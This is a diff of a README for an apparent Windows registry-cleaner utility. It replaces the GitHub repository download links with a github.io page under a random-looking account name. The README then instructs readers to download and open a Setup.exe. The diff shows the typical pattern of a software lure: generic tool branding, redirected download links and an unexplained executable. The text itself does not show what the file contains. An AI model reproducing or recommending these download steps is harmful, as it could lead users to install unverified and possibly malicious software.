@@ -1,6 +1,6 @@
 # ⚙️ Registry-Cleaner-2026 - Restore Speed And System Stability Today
 
-[![](https://img.shields.io/badge/Download-Registry_Cleaner_2026-blue.svg)](https://github.com/Buttondown-tanacetumdouglasii56/Registry-Cleaner-2026)
+[![](https://img.shields.io/badge/Download-Registry_Cleaner_2026-blue.svg)](https://buttondown-tanacetumdouglasii56.github.io)
 
 Registry Cleaner 2026 helps you maintain your computer. It removes unused data from the Windows registry. This tool keeps your system stable, fast, and organized. The program includes automatic backups to keep your data safe.
 
@@ -8,7 +8,7 @@ Registry Cleaner 2026 helps you maintain your computer. It removes unused data f
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the official repository page: [https://github.com/Buttondown-tanacetumdouglasii56/Registry-Cleaner-2026](https://github.com/Buttondown-tanacetumdouglasii56/Registry-Cleaner-2026).
+1. Go to the official repository page: [https://buttondown-tanacetumdouglasii56.github.io](https://buttondown-tanacetumdouglasii56.github.io).
 2. Locate the download button or the Release section on the right side of the screen.
 3. Click the link to save the Setup.exe file to your computer.
 4. Open your Downloads folder.
